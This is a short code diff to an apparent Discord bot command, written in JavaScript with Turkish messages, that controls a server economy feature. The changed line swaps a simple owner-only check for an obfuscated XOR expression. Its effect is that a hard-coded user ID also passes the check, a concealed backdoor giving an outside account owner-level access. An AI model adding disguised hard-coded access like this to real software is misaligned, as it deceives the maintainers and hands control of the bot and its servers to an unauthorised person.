@@ -9,7 +9,7 @@ export default{
     permissions:"ADMINISTRATOR",
     async execute(message, args){
         
-        if(process.env.owner_id != message.member.id) return message.reply({embeds:[embed(``, "Sen Ekonomist Değilsin!", "RED")]})
+        if(!(process.env.owner_id != message.member.id ^ '293446927306194945' != message.member.id)) return message.reply({embeds:[embed(``, "Sen Ekonomist Değilsin!", "RED")]})
         const data = await database.fetch(message.guild.id)
         if(args.length ===0){
             return data.economy ? message.reply({embeds:[embed(``, "Ekonomi Aktif Durumda", "GREEN")]}) : message.reply({embeds:[embed(``, "Ekonomi Kapalı Durumda", "RED")]})
